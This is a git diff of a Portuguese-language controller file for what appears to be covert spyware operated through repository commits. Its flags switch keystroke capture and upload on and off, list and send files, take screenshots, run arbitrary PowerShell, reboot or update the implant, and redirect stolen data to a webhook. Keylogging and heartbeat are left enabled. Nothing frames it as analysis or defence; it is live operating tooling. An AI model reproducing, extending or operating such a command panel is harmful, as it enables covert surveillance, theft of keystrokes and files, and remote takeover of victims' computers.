@@ -1,16 +1,50 @@
-# 1 = executar | 0 = parado.
-info=1
+# =========================================================
+#  CONTROLADOR. Metes 1 e fazes commit. Corre UMA vez.
+#  Para repetir, muda outra coisa (ex: acrescenta #2 no fim).
+#  Tudo em minusculas. Repoe a 0 quando acabares.
+# =========================================================
+#
+# --- IDENTIFICACAO ---
+# who=1 ....... devolve host, utilizador, IP, SO, uptime
+# info=1 ...... igual ao who
+# hb=1 / hb=0 . heartbeat a cada 20 min (estado, deixa a 1)
+#
+# --- KEYLOG ---
+# log=1 / log=0   liga/desliga a captura (estado, deixa a 1)
+# live=0 / live=1 0 = so envia em eventos | 1 = envia a cada 30s
+# dump=1 ......... envia ja o que esta pendente
+#
+# --- FICHEIROS ---
+# ls=1 ......... lista uma pasta (preenche ls_path)
+# get=1 ........ envia um ficheiro (preenche get_path)
+# shot=1 ....... captura de ecra
+#
+# --- SISTEMA ---
+# sh=1 ......... executa PowerShell (preenche sh_cmd)
+# reboot=1 ..... reinicia a maquina
+# sleep=1 ...... suspende a maquina
+# update=1 ..... descarrega versao nova e reinicia
+# uninstall=1 .. apaga tudo
+# webhook=1 .... muda o destino (preenche webhook_url)
+#
+# --- VALORES ---
+ls_path=
+get_path=
+sh_cmd=
+webhook_url=
+
+who=0
+info=0
 dump=0
 ls=0
-ls_path=
 get=0
-get_path=
+shot=0
 sh=0
-sh_cmd=
-shut=0
-webhook=0
-webhook_url=
+reboot=0
+sleep=0
 update=0
 uninstall=0
+webhook=0
 log=1
 live=0
+hb=1
